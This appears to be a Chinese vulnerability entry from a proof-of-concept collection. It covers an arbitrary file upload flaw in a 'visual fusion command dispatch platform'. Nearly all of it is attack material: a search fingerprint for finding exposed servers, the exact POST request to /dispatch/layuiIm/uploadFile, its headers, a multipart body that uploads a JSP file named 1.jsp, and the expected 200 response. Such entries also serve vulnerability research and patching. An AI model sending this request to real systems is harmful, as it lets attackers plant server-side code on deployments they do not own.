# 可视化融合指挥调度平台uploadFile存在任意文件上传漏洞

- **系统**：可视化融合指挥调度平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="base/searchInfoWindow_min.css"`
- **请求**：`POST /dispatch/layuiIm/uploadFile HTTP/1.1`
- **关键头**：`Sec-Fetch-User: ?1`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307…`　`Content-Length: 151`

**请求体 / payload**
```
------WebKitFormBoundary7ctER307B0RaQwOp
Content-Disposition: form-data; name="file";filename="1.jsp"
1
------WebKitFormBoundary7ctER307B0RaQwOp--
```
- **预期**：200　|　—